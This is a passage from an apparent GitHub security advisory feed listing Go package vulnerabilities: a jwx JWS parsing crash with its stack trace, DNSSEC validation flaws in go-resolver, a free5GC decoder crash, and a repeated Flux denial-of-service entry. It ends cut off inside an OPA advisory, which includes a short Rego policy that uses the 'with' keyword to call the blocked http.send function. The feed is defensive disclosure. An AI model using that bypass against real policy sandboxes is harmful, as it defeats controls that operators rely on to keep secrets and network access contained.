encoding/json.(*decodeState).object(0xc0000ea028, {0x64fa60?, 0xc0000a2140?, 0x16?})
        /usr/local/go/src/encoding/json/decode.go:604 +0x6cc
encoding/json.(*decodeState).value(0xc0000ea028, {0x64fa60?, 0xc0000a2140?, 0xc00006e630?})
        /usr/local/go/src/encoding/json/decode.go:374 +0x3e
encoding/json.(*decodeState).unmarshal(0xc0000ea028, {0x64fa60?, 0xc0000a2140?})
        /usr/local/go/src/encoding/json/decode.go:181 +0x133
encoding/json.(*Decoder).Decode(0xc0000ea000, {0x64fa60, 0xc0000a2140})
        /usr/local/go/src/encoding/json/stream.go:73 +0x179
github.com/lestrrat-go/jwx/v2/internal/json.Unmarshal({0xc00001a288, 0x11, 0x11}, {0x64fa60, 0xc0000a2140})
        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/internal/json/json.go:26 +0x97
github.com/lestrrat-go/jwx/v2/jws.parseJSON({0xc00001a288, 0x11, 0x11})
        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/jws/jws.go:588 +0x50
github.com/lestrrat-go/jwx/v2/jws.Parse({0xc00001a288, 0x11, 0x11}, {0x0?, 0xc00006e760?, 0x48450f?})
        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/jws/jws.go:525 +0x89
poc.TestPOC(0x0?)
        /home/fredrik/src/jwx_poc/poc_test.go:10 +0x57
testing.tRunner(0xc0000e4340, 0x68ef30)
        /usr/local/go/src/testing/testing.go:1595 +0xff
created by testing.(*T).Run in goroutine 1
        /usr/local/go/src/testing/testing.go:1648 +0x3ad
exit status 2
FAIL    poc     0.005s
</code></pre>
<h3 id="impact">Impact</h3>
<p>The vulnerability can be used to crash / DOS a system doing JWS verification.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lestrrat-go/jwx/security/advisories/GHSA-pvcr-v8j8-j5q3">https://github.com/lestrrat-go/jwx/security/advisories/GHSA-pvcr-v8j8-j5q3</a></li>
<li><a href="https://github.com/lestrrat-go/jwx/commit/0e8802ce6842625845d651456493e7c87625601f">https://github.com/lestrrat-go/jwx/commit/0e8802ce6842625845d651456493e7c87625601f</a></li>
<li><a href="https://github.com/lestrrat-go/jwx/commit/d69a721931a5c48b9850a42404f18e143704adcd">https://github.com/lestrrat-go/jwx/commit/d69a721931a5c48b9850a42404f18e143704adcd</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21664">https://nvd.nist.gov/vuln/detail/CVE-2024-21664</a></li>
<li><a href="https://github.com/lestrrat-go/jwx/commit/8c53d0ae52d5ab1e2b37c5abb67def9e7958fd65">https://github.com/lestrrat-go/jwx/commit/8c53d0ae52d5ab1e2b37c5abb67def9e7958fd65</a></li>
<li><a href="https://github.com/advisories/GHSA-pvcr-v8j8-j5q3">https://github.com/advisories/GHSA-pvcr-v8j8-j5q3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pvcr-v8j8-j5q3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-09T16:18:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/peterzen/goresolver] go-resolver vulnerable to attacker-controlled domains due to unvalidated RRSIG RRs]]></title>
        <id>https://github.com/advisories/GHSA-87mm-qxm5-cp3f</id>
        <link href="https://github.com/advisories/GHSA-87mm-qxm5-cp3f"/>
        <updated>2024-01-23T20:39:13.000Z</updated>
        <content type="html"><![CDATA[<p>go-resolver's DNSSEC validation is not performed correctly. An attacker can cause this package to report successful validation for invalid, attacker-controlled records. The owner name of RRSIG RRs is not validated, permitting an attacker to present the RRSIG for an attacker-controlled domain in a response for any other domain.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-3346">https://nvd.nist.gov/vuln/detail/CVE-2022-3346</a></li>
<li><a href="https://github.com/peterzen/goresolver/issues/5">https://github.com/peterzen/goresolver/issues/5</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-0979">https://pkg.go.dev/vuln/GO-2022-0979</a></li>
<li><a href="https://github.com/advisories/GHSA-87mm-qxm5-cp3f">https://github.com/advisories/GHSA-87mm-qxm5-cp3f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-87mm-qxm5-cp3f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-12-28T03:30:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/peterzen/goresolver] go-resolver's DNSSEC validation not performed correctly]]></title>
        <id>https://github.com/advisories/GHSA-jr65-gpj5-cw74</id>
        <link href="https://github.com/advisories/GHSA-jr65-gpj5-cw74"/>
        <updated>2024-01-23T20:39:00.000Z</updated>
        <content type="html"><![CDATA[<p>go-resolver's DNSSEC validation is not performed correctly. An attacker can cause this package to report successful validation for invalid, attacker-controlled records. Root DNSSEC public keys are not validated, permitting an attacker to present a self-signed root key and delegation chain.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-3347">https://nvd.nist.gov/vuln/detail/CVE-2022-3347</a></li>
<li><a href="https://github.com/peterzen/goresolver/issues/5#issuecomment-1150214257">https://github.com/peterzen/goresolver/issues/5#issuecomment-1150214257</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-1026">https://pkg.go.dev/vuln/GO-2022-1026</a></li>
<li><a href="https://github.com/advisories/GHSA-jr65-gpj5-cw74">https://github.com/advisories/GHSA-jr65-gpj5-cw74</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jr65-gpj5-cw74</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-12-28T03:30:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/free5gc/free5gc] free5GC vulnerable to malformed NGAP message crashing the AMF and NGAP decoders]]></title>
        <id>https://github.com/advisories/GHSA-59hj-62f5-fgmc</id>
        <link href="https://github.com/advisories/GHSA-59hj-62f5-fgmc"/>
        <updated>2024-01-23T20:38:22.000Z</updated>
        <content type="html"><![CDATA[<p>In free5GC 3.2.1, a malformed NGAP message can crash the AMF and NGAP decoders via an index-out-of-range panic in <code>aper.GetBitString</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-43677">https://nvd.nist.gov/vuln/detail/CVE-2022-43677</a></li>
<li><a href="https://github.com/free5gc/free5gc/issues/402">https://github.com/free5gc/free5gc/issues/402</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-1083">https://pkg.go.dev/vuln/GO-2022-1083</a></li>
<li><a href="https://github.com/advisories/GHSA-59hj-62f5-fgmc">https://github.com/advisories/GHSA-59hj-62f5-fgmc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-59hj-62f5-fgmc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-10-24T19:00:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/fluxcd/source-controller/api] Improper use of metav1.Duration allows for Denial of Service]]></title>
        <id>https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</id>
        <link href="https://github.com/advisories/GHSA-f4p5-x4vc-mh4v"/>
        <updated>2024-01-23T20:38:07.000Z</updated>
        <content type="html"><![CDATA[<p>Flux controllers within the affected versions range are vulnerable to a denial of service attack. Users that have permissions to change Flux’s objects, either through a Flux source or directly within a cluster, can provide invalid data to fields <code>.spec.interval</code> or <code>.spec.timeout</code> (and structured variations of these fields), causing the entire object type to stop being processed.</p>
<p>The issue has two root causes: a) the Kubernetes type <code>metav1.Duration</code> not being fully compatible with the Go type <code>time.Duration</code> as explained on <a href="https://github.com/kubernetes/apimachinery/issues/131">upstream report</a>; b) lack of validation within Flux to restrict allowed values.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Admission controllers can be employed to restrict the values that can be used for fields <code>.spec.interval</code> and <code>.spec.timeout</code>, however upgrading to the latest versions is still the recommended mitigation.</p>
<h3 id="credits">Credits</h3>
<p>This issue was reported by Alexander Block (@codablock) through the Flux security mailing list (as <a href="https://fluxcd.io/security/#report-a-vulnerability">recommended</a>).</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in any of the affected repositories.</li>
<li>Contact us at the CNCF Flux channel.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kubernetes/apimachinery/issues/131">https://github.com/kubernetes/apimachinery/issues/131</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/fluxcd/flux2/security/advisories/GHSA-f4p5-x4vc-mh4v">https://github.com/fluxcd/flux2/security/advisories/GHSA-f4p5-x4vc-mh4v</a></li>
<li><a href="https://github.com/kubernetes/apimachinery/issues/131">https://github.com/kubernetes/apimachinery/issues/131</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39272">https://nvd.nist.gov/vuln/detail/CVE-2022-39272</a></li>
<li><a href="https://github.com/fluxcd/helm-controller/pull/533">https://github.com/fluxcd/helm-controller/pull/533</a></li>
<li><a href="https://github.com/fluxcd/image-automation-controller/pull/439">https://github.com/fluxcd/image-automation-controller/pull/439</a></li>
<li><a href="https://github.com/fluxcd/image-reflector-controller/pull/314">https://github.com/fluxcd/image-reflector-controller/pull/314</a></li>
<li><a href="https://github.com/fluxcd/kustomize-controller/pull/731">https://github.com/fluxcd/kustomize-controller/pull/731</a></li>
<li><a href="https://github.com/fluxcd/notification-controller/pull/420">https://github.com/fluxcd/notification-controller/pull/420</a></li>
<li><a href="https://github.com/fluxcd/source-controller/pull/903">https://github.com/fluxcd/source-controller/pull/903</a></li>
<li><a href="https://github.com/kubernetes/apimachinery#131">https://github.com/kubernetes/apimachinery#131</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-1071">https://pkg.go.dev/vuln/GO-2022-1071</a></li>
<li><a href="https://github.com/advisories/GHSA-f4p5-x4vc-mh4v">https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-10-19T18:40:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/fluxcd/notification-controller/api] Improper use of metav1.Duration allows for Denial of Service]]></title>
        <id>https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</id>
        <link href="https://github.com/advisories/GHSA-f4p5-x4vc-mh4v"/>
        <updated>2024-01-23T20:38:07.000Z</updated>
        <content type="html"><![CDATA[<p>Flux controllers within the affected versions range are vulnerable to a denial of service attack. Users that have permissions to change Flux’s objects, either through a Flux source or directly within a cluster, can provide invalid data to fields <code>.spec.interval</code> or <code>.spec.timeout</code> (and structured variations of these fields), causing the entire object type to stop being processed.</p>
<p>The issue has two root causes: a) the Kubernetes type <code>metav1.Duration</code> not being fully compatible with the Go type <code>time.Duration</code> as explained on <a href="https://github.com/kubernetes/apimachinery/issues/131">upstream report</a>; b) lack of validation within Flux to restrict allowed values.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Admission controllers can be employed to restrict the values that can be used for fields <code>.spec.interval</code> and <code>.spec.timeout</code>, however upgrading to the latest versions is still the recommended mitigation.</p>
<h3 id="credits">Credits</h3>
<p>This issue was reported by Alexander Block (@codablock) through the Flux security mailing list (as <a href="https://fluxcd.io/security/#report-a-vulnerability">recommended</a>).</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in any of the affected repositories.</li>
<li>Contact us at the CNCF Flux channel.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kubernetes/apimachinery/issues/131">https://github.com/kubernetes/apimachinery/issues/131</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/fluxcd/flux2/security/advisories/GHSA-f4p5-x4vc-mh4v">https://github.com/fluxcd/flux2/security/advisories/GHSA-f4p5-x4vc-mh4v</a></li>
<li><a href="https://github.com/kubernetes/apimachinery/issues/131">https://github.com/kubernetes/apimachinery/issues/131</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39272">https://nvd.nist.gov/vuln/detail/CVE-2022-39272</a></li>
<li><a href="https://github.com/fluxcd/helm-controller/pull/533">https://github.com/fluxcd/helm-controller/pull/533</a></li>
<li><a href="https://github.com/fluxcd/image-automation-controller/pull/439">https://github.com/fluxcd/image-automation-controller/pull/439</a></li>
<li><a href="https://github.com/fluxcd/image-reflector-controller/pull/314">https://github.com/fluxcd/image-reflector-controller/pull/314</a></li>
<li><a href="https://github.com/fluxcd/kustomize-controller/pull/731">https://github.com/fluxcd/kustomize-controller/pull/731</a></li>
<li><a href="https://github.com/fluxcd/notification-controller/pull/420">https://github.com/fluxcd/notification-controller/pull/420</a></li>
<li><a href="https://github.com/fluxcd/source-controller/pull/903">https://github.com/fluxcd/source-controller/pull/903</a></li>
<li><a href="https://github.com/kubernetes/apimachinery#131">https://github.com/kubernetes/apimachinery#131</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-1071">https://pkg.go.dev/vuln/GO-2022-1071</a></li>
<li><a href="https://github.com/advisories/GHSA-f4p5-x4vc-mh4v">https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-10-19T18:40:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/fluxcd/kustomize-controller/api] Improper use of metav1.Duration allows for Denial of Service]]></title>
        <id>https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</id>
        <link href="https://github.com/advisories/GHSA-f4p5-x4vc-mh4v"/>
        <updated>2024-01-23T20:38:07.000Z</updated>
        <content type="html"><![CDATA[<p>Flux controllers within the affected versions range are vulnerable to a denial of service attack. Users that have permissions to change Flux’s objects, either through a Flux source or directly within a cluster, can provide invalid data to fields <code>.spec.interval</code> or <code>.spec.timeout</code> (and structured variations of these fields), causing the entire object type to stop being processed.</p>
<p>The issue has two root causes: a) the Kubernetes type <code>metav1.Duration</code> not being fully compatible with the Go type <code>time.Duration</code> as explained on <a href="https://github.com/kubernetes/apimachinery/issues/131">upstream report</a>; b) lack of validation within Flux to restrict allowed values.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Admission controllers can be employed to restrict the values that can be used for fields <code>.spec.interval</code> and <code>.spec.timeout</code>, however upgrading to the latest versions is still the recommended mitigation.</p>
<h3 id="credits">Credits</h3>
<p>This issue was reported by Alexander Block (@codablock) through the Flux security mailing list (as <a href="https://fluxcd.io/security/#report-a-vulnerability">recommended</a>).</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in any of the affected repositories.</li>
<li>Contact us at the CNCF Flux channel.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kubernetes/apimachinery/issues/131">https://github.com/kubernetes/apimachinery/issues/131</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/fluxcd/flux2/security/advisories/GHSA-f4p5-x4vc-mh4v">https://github.com/fluxcd/flux2/security/advisories/GHSA-f4p5-x4vc-mh4v</a></li>
<li><a href="https://github.com/kubernetes/apimachinery/issues/131">https://github.com/kubernetes/apimachinery/issues/131</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39272">https://nvd.nist.gov/vuln/detail/CVE-2022-39272</a></li>
<li><a href="https://github.com/fluxcd/helm-controller/pull/533">https://github.com/fluxcd/helm-controller/pull/533</a></li>
<li><a href="https://github.com/fluxcd/image-automation-controller/pull/439">https://github.com/fluxcd/image-automation-controller/pull/439</a></li>
<li><a href="https://github.com/fluxcd/image-reflector-controller/pull/314">https://github.com/fluxcd/image-reflector-controller/pull/314</a></li>
<li><a href="https://github.com/fluxcd/kustomize-controller/pull/731">https://github.com/fluxcd/kustomize-controller/pull/731</a></li>
<li><a href="https://github.com/fluxcd/notification-controller/pull/420">https://github.com/fluxcd/notification-controller/pull/420</a></li>
<li><a href="https://github.com/fluxcd/source-controller/pull/903">https://github.com/fluxcd/source-controller/pull/903</a></li>
<li><a href="https://github.com/kubernetes/apimachinery#131">https://github.com/kubernetes/apimachinery#131</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-1071">https://pkg.go.dev/vuln/GO-2022-1071</a></li>
<li><a href="https://github.com/advisories/GHSA-f4p5-x4vc-mh4v">https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-10-19T18:40:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/fluxcd/image-reflector-controller/api] Improper use of metav1.Duration allows for Denial of Service]]></title>
        <id>https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</id>
        <link href="https://github.com/advisories/GHSA-f4p5-x4vc-mh4v"/>
        <updated>2024-01-23T20:38:07.000Z</updated>
        <content type="html"><![CDATA[<p>Flux controllers within the affected versions range are vulnerable to a denial of service attack. Users that have permissions to change Flux’s objects, either through a Flux source or directly within a cluster, can provide invalid data to fields <code>.spec.interval</code> or <code>.spec.timeout</code> (and structured variations of these fields), causing the entire object type to stop being processed.</p>
<p>The issue has two root causes: a) the Kubernetes type <code>metav1.Duration</code> not being fully compatible with the Go type <code>time.Duration</code> as explained on <a href="https://github.com/kubernetes/apimachinery/issues/131">upstream report</a>; b) lack of validation within Flux to restrict allowed values.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Admission controllers can be employed to restrict the values that can be used for fields <code>.spec.interval</code> and <code>.spec.timeout</code>, however upgrading to the latest versions is still the recommended mitigation.</p>
<h3 id="credits">Credits</h3>
<p>This issue was reported by Alexander Block (@codablock) through the Flux security mailing list (as <a href="https://fluxcd.io/security/#report-a-vulnerability">recommended</a>).</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in any of the affected repositories.</li>
<li>Contact us at the CNCF Flux channel.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kubernetes/apimachinery/issues/131">https://github.com/kubernetes/apimachinery/issues/131</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/fluxcd/flux2/security/advisories/GHSA-f4p5-x4vc-mh4v">https://github.com/fluxcd/flux2/security/advisories/GHSA-f4p5-x4vc-mh4v</a></li>
<li><a href="https://github.com/kubernetes/apimachinery/issues/131">https://github.com/kubernetes/apimachinery/issues/131</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39272">https://nvd.nist.gov/vuln/detail/CVE-2022-39272</a></li>
<li><a href="https://github.com/fluxcd/helm-controller/pull/533">https://github.com/fluxcd/helm-controller/pull/533</a></li>
<li><a href="https://github.com/fluxcd/image-automation-controller/pull/439">https://github.com/fluxcd/image-automation-controller/pull/439</a></li>
<li><a href="https://github.com/fluxcd/image-reflector-controller/pull/314">https://github.com/fluxcd/image-reflector-controller/pull/314</a></li>
<li><a href="https://github.com/fluxcd/kustomize-controller/pull/731">https://github.com/fluxcd/kustomize-controller/pull/731</a></li>
<li><a href="https://github.com/fluxcd/notification-controller/pull/420">https://github.com/fluxcd/notification-controller/pull/420</a></li>
<li><a href="https://github.com/fluxcd/source-controller/pull/903">https://github.com/fluxcd/source-controller/pull/903</a></li>
<li><a href="https://github.com/kubernetes/apimachinery#131">https://github.com/kubernetes/apimachinery#131</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-1071">https://pkg.go.dev/vuln/GO-2022-1071</a></li>
<li><a href="https://github.com/advisories/GHSA-f4p5-x4vc-mh4v">https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-10-19T18:40:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/fluxcd/image-automation-controller/api] Improper use of metav1.Duration allows for Denial of Service]]></title>
        <id>https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</id>
        <link href="https://github.com/advisories/GHSA-f4p5-x4vc-mh4v"/>
        <updated>2024-01-23T20:38:07.000Z</updated>
        <content type="html"><![CDATA[<p>Flux controllers within the affected versions range are vulnerable to a denial of service attack. Users that have permissions to change Flux’s objects, either through a Flux source or directly within a cluster, can provide invalid data to fields <code>.spec.interval</code> or <code>.spec.timeout</code> (and structured variations of these fields), causing the entire object type to stop being processed.</p>
<p>The issue has two root causes: a) the Kubernetes type <code>metav1.Duration</code> not being fully compatible with the Go type <code>time.Duration</code> as explained on <a href="https://github.com/kubernetes/apimachinery/issues/131">upstream report</a>; b) lack of validation within Flux to restrict allowed values.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Admission controllers can be employed to restrict the values that can be used for fields <code>.spec.interval</code> and <code>.spec.timeout</code>, however upgrading to the latest versions is still the recommended mitigation.</p>
<h3 id="credits">Credits</h3>
<p>This issue was reported by Alexander Block (@codablock) through the Flux security mailing list (as <a href="https://fluxcd.io/security/#report-a-vulnerability">recommended</a>).</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in any of the affected repositories.</li>
<li>Contact us at the CNCF Flux channel.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kubernetes/apimachinery/issues/131">https://github.com/kubernetes/apimachinery/issues/131</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/fluxcd/flux2/security/advisories/GHSA-f4p5-x4vc-mh4v">https://github.com/fluxcd/flux2/security/advisories/GHSA-f4p5-x4vc-mh4v</a></li>
<li><a href="https://github.com/kubernetes/apimachinery/issues/131">https://github.com/kubernetes/apimachinery/issues/131</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39272">https://nvd.nist.gov/vuln/detail/CVE-2022-39272</a></li>
<li><a href="https://github.com/fluxcd/helm-controller/pull/533">https://github.com/fluxcd/helm-controller/pull/533</a></li>
<li><a href="https://github.com/fluxcd/image-automation-controller/pull/439">https://github.com/fluxcd/image-automation-controller/pull/439</a></li>
<li><a href="https://github.com/fluxcd/image-reflector-controller/pull/314">https://github.com/fluxcd/image-reflector-controller/pull/314</a></li>
<li><a href="https://github.com/fluxcd/kustomize-controller/pull/731">https://github.com/fluxcd/kustomize-controller/pull/731</a></li>
<li><a href="https://github.com/fluxcd/notification-controller/pull/420">https://github.com/fluxcd/notification-controller/pull/420</a></li>
<li><a href="https://github.com/fluxcd/source-controller/pull/903">https://github.com/fluxcd/source-controller/pull/903</a></li>
<li><a href="https://github.com/kubernetes/apimachinery#131">https://github.com/kubernetes/apimachinery#131</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-1071">https://pkg.go.dev/vuln/GO-2022-1071</a></li>
<li><a href="https://github.com/advisories/GHSA-f4p5-x4vc-mh4v">https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-10-19T18:40:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/fluxcd/helm-controller/api] Improper use of metav1.Duration allows for Denial of Service]]></title>
        <id>https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</id>
        <link href="https://github.com/advisories/GHSA-f4p5-x4vc-mh4v"/>
        <updated>2024-01-23T20:38:07.000Z</updated>
        <content type="html"><![CDATA[<p>Flux controllers within the affected versions range are vulnerable to a denial of service attack. Users that have permissions to change Flux’s objects, either through a Flux source or directly within a cluster, can provide invalid data to fields <code>.spec.interval</code> or <code>.spec.timeout</code> (and structured variations of these fields), causing the entire object type to stop being processed.</p>
<p>The issue has two root causes: a) the Kubernetes type <code>metav1.Duration</code> not being fully compatible with the Go type <code>time.Duration</code> as explained on <a href="https://github.com/kubernetes/apimachinery/issues/131">upstream report</a>; b) lack of validation within Flux to restrict allowed values.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Admission controllers can be employed to restrict the values that can be used for fields <code>.spec.interval</code> and <code>.spec.timeout</code>, however upgrading to the latest versions is still the recommended mitigation.</p>
<h3 id="credits">Credits</h3>
<p>This issue was reported by Alexander Block (@codablock) through the Flux security mailing list (as <a href="https://fluxcd.io/security/#report-a-vulnerability">recommended</a>).</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in any of the affected repositories.</li>
<li>Contact us at the CNCF Flux channel.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kubernetes/apimachinery/issues/131">https://github.com/kubernetes/apimachinery/issues/131</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/fluxcd/flux2/security/advisories/GHSA-f4p5-x4vc-mh4v">https://github.com/fluxcd/flux2/security/advisories/GHSA-f4p5-x4vc-mh4v</a></li>
<li><a href="https://github.com/kubernetes/apimachinery/issues/131">https://github.com/kubernetes/apimachinery/issues/131</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39272">https://nvd.nist.gov/vuln/detail/CVE-2022-39272</a></li>
<li><a href="https://github.com/fluxcd/helm-controller/pull/533">https://github.com/fluxcd/helm-controller/pull/533</a></li>
<li><a href="https://github.com/fluxcd/image-automation-controller/pull/439">https://github.com/fluxcd/image-automation-controller/pull/439</a></li>
<li><a href="https://github.com/fluxcd/image-reflector-controller/pull/314">https://github.com/fluxcd/image-reflector-controller/pull/314</a></li>
<li><a href="https://github.com/fluxcd/kustomize-controller/pull/731">https://github.com/fluxcd/kustomize-controller/pull/731</a></li>
<li><a href="https://github.com/fluxcd/notification-controller/pull/420">https://github.com/fluxcd/notification-controller/pull/420</a></li>
<li><a href="https://github.com/fluxcd/source-controller/pull/903">https://github.com/fluxcd/source-controller/pull/903</a></li>
<li><a href="https://github.com/kubernetes/apimachinery#131">https://github.com/kubernetes/apimachinery#131</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-1071">https://pkg.go.dev/vuln/GO-2022-1071</a></li>
<li><a href="https://github.com/advisories/GHSA-f4p5-x4vc-mh4v">https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-10-19T18:40:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/open-policy-agent/opa] OPA Compiler: Bypass of WithUnsafeBuiltins using "with" keyword to mock functions]]></title>
        <id>https://github.com/advisories/GHSA-f524-rf33-2jjr</id>
        <link href="https://github.com/advisories/GHSA-f524-rf33-2jjr"/>
        <updated>2024-01-23T20:38:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Rego compiler provides a (deprecated) <code>WithUnsafeBuiltins</code> function, which allows users to provide a set of built-in functions that should be deemed unsafe — and as such rejected — by the compiler if encountered in the policy compilation stage. A bypass of this protection has been found, where the use of the <code>with</code> keyword to mock such a built-in function (a feature introduced in OPA v0.40.0), isn’t taken into account by <code>WithUnsafeBuiltins</code>.</p>
<p>The same method is exposed via <code>rego.UnsafeBuiltins</code> in the <code>github.com/open-policy-agent/opa/rego</code> package.</p>
<p>When provided e.g. the <code>http.send</code> built-in function to <code>WithUnsafeBuiltins</code>, the following policy would still compile, and call the <code>http.send</code> function with the arguments provided to the <code>is_object</code> function when evaluated:</p>
<pre><code class="language-rego">package policy

foo := is_object({
    "method": "get", 
    "url": "https://www.openpolicyagent.org"
})

allow := r {
    r := foo with is_object as http.send
}
</code></pre>
<p>Both built-in functions and user provided (i.e. custom) functions are mockable using this construct.</p>
<p>In addition to <code>http.send</code>, the <code>opa.runtime</code> built-in function is commonly considered unsafe in integrations where policy provided by untrusted parties is evaluated, as it risks exposing configuration, or environment variables, potentially carrying sensitive information.</p>
<h4 id="affected-users">Affected Users</h4>
<p><strong>All of these conditions have to be met</strong> to create an adverse effect:</p>
<ul>
<li>Use the Go API for policy evaluation (not the OPA server, or the Go SDK)</li>
<li>Make use of the <code>WithUnsafeBuiltins</code> method in order to deny certain built-in functions, like e.g. <code>http.send</code>, from being used in policy evaluation.</li>
<li>Allow policy evaluation of policies provided by untrusted parties.</li>
